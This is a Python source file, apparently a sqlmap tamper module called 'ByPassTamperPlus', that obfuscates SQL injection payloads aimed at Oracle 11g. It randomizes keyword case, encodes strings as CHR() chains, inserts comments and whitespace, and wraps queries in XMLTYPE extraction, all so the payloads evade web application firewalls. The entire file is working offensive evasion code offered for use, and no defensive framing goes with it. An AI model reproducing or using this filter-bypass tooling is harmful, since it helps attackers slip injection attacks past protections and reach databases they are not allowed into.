#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle11g_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "ALL", "AND", "OR", "ORDER", "BY", "GROUP", "HAVING", "DUAL", "XMLTYPE", "EXTRACT", "GETSTRINGVAL"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    def string_to_chr(match):
        s = match.group(1)
        if len(s) > 1:
            return "||".join("CHR(%d)" % ord(c) for c in s)
        return match.group(0)
    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", string_to_chr, payload)

    payload = payload.replace(" AND ", "/**/AND/**/").replace(" OR ", "/**/OR/**/")

    def random_space(match):
        return random.choice(["/**/", "\n", "\t", "/*%s*/" % "".join(random.choices("0123456789", k=5))])
    payload = re.sub(r"\s+", random_space, payload)

    identifiers = ["USER", "DUAL", "SESSION_ROLES", "ALL_TABLES", "ALL_TAB_COLUMNS"]
    for iden in identifiers:
        payload = re.sub(r"\b%s\b" % iden, '"%s"' % iden, payload, flags=re.IGNORECASE)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "FROM DUAL" in payload.upper():
        match = re.search(r"SELECT\s+(.+?)\s+FROM\s+DUAL", payload, re.IGNORECASE)
        if match:
            inner = match.group(1)
            payload = payload.replace(match.group(0), "SELECT XMLTYPE('<a>'||(%s)||'</a>').EXTRACT('//text()').GETSTRINGVAL() FROM DUAL" % inner)

    payload = re.sub(r"UNION\s+SELECT\s+(\d+)", r"UNION SELECT NUMTOYMINTERVAL(\1,'DAY')", payload, flags=re.IGNORECASE)

    payload = re.sub(r"AS\s+(\w+)", r'AS "VIRTUAL_\1"', payload, flags=re.IGNORECASE)

    payload = re.sub(r"\bALL_TABLES\b", "(SELECT TABLE_NAME FROM ALL_TAB_PARTITIONS WHERE PARTITION_NAME LIKE 'P%')", payload, flags=re.IGNORECASE)

    return general_obfuscate(payload)
